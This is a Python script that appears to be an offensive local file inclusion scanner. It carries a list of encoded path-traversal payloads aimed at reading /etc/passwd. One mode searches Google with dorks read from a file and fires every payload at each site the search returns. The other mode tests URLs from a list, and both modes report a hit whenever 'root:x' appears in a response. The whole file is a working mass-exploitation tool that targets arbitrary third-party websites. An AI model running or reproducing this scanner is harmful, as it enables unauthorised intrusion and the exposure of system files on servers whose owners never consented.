import requests
from bs4 import BeautifulSoup
from urllib.parse import unquote
from colorama import Fore, Style
import time
import entery

class LFIScanner:
    def __init__(self):
        self.lfi_payloads = ["../../../../../../../../../../../etc/passwd,../../../../../../../../../../../etc/passwd",
                             "/etc/passwd", "/..././..././..././..././..././..././..././..././etc/passwd%00",
                             "../../../../../../../..//etc/passwd",
                             "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
                             "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
                             "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
                             "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd",
                             "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e"
                             "//etc/passwd",
                             "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e"
                             "%252f%252e%252e%252f%252e%252e%252f/etc/passwd",
                             "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd",
                             "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd",
                             "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd",
                             "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd"]

    def google_lfi(self, num_results: int):
        search_engine = "https://www.google.com/search"
        with open("lfi.txt", "r") as f:
            dorks = f.readlines()
        for dork in dorks:
            dork = dork.strip()
            url = f"{search_engine}?q={dork}&num={num_results}"
            response = requests.get(url)
            soup = BeautifulSoup(response.text, "html.parser")
            results = soup.find_all("a")
            urls = []
            for result in results:
                href = result.get("href")
                if href.startswith("/url?q="):
                    url = href[7:].split("&")[0]
                    url = unquote(url)
                    urls.append(url)
            for url in urls:
                for payload in self.lfi_payloads:
                    target_url = f"{url}{payload}"
                    try:
                        response = requests.get(target_url)
                        if "root:x:" in response.text:
                            print(
                                Fore.RED + Style.BRIGHT + "[+]" + Fore.GREEN + Style.BRIGHT + "LFI vulnerability "
                                                                                              "found at " + Fore.RED
                                + Style.BRIGHT + f"{target_url}" + Style.RESET_ALL)
                        else:
                            print(
                                Fore.BLUE + Style.BRIGHT + "[-]" + Fore.GREEN + Style.BRIGHT + f"{target_url}" + Fore.YELLOW + " is not vulnerable to LFI")
                    except requests.exceptions.ConnectionError:
                        print(
                            Fore.YELLOW + f"[!] Connection error while accessing {target_url}. Retrying in 5 seconds..." + Style.RESET_ALL)
                        time.sleep(5)

    def check_lfi(self, url):
        for payload in self.lfi_payloads:
            r = requests.get(url + payload, headers={"User-Agent": payload})
            if 'root:x' in r.text:
                print(Fore.RED + Style.BRIGHT + "[+]" + Fore.GREEN + Style.BRIGHT +"LFI vulnerability found at %s%s" % (url, payload))
            else:
                print(Fore.BLUE + Style.BRIGHT + "[-]" + Fore.GREEN + Style.BRIGHT +"LFI is not found at %s%s" % (url, payload))
        return False

    def run(self):
        while True:
            a = input(
                Fore.YELLOW + Style.BRIGHT + "\t>>> Scan LFI with dork click 1 : \n" + Fore.BLUE + Style.BRIGHT + "\t>>> "
                                                                                                                "Scan"
                                                                                                                " LFI "
                                                                                                                "in "
                                                                                                                "target url click 2 : \n" + Fore.MAGENTA + Style.BRIGHT + "\t>>> For Quit click 0 : \n"+ Fore.CYAN + Style.BRIGHT +"\t>>>" )
            if a == "1":
                take_number = input(
                    Fore.BLUE + Style.BRIGHT + "<Example Result Number: 20>" + Fore.MAGENTA + Style.BRIGHT + "\nEnter "
                                                                                                             "The "
                                                                                                             "Number "
                                                                                                             "Of "
                                                                                                             "Search "
                                                                                                             "Results: ")
                self.google_lfi(take_number)
                print(Fore.GREEN + Style.BRIGHT + "Search finished.")
            elif a == "2":
                url_list_path = input(Fore.CYAN + Style.BRIGHT + "Enter the URL list file path: ")
                with open(url_list_path, 'r') as f:
                    urls = f.readlines()
                for url in urls:
                    url = url.strip()
                    self.check_lfi(url)
                print(Fore.GREEN + Style.BRIGHT + "Search finished.")
            elif a == "0":
                print(Fore.CYAN + Style.BRIGHT + "Quitting...")
                break
            else:
                print(Fore.RED + Style.BRIGHT + "Please Choose 1 or 2 !?")
            input(Fore.YELLOW + Style.BRIGHT + "Press enter to continue...")


entery.entryy()
lfi_scanner = LFIScanner()
lfi_scanner.run()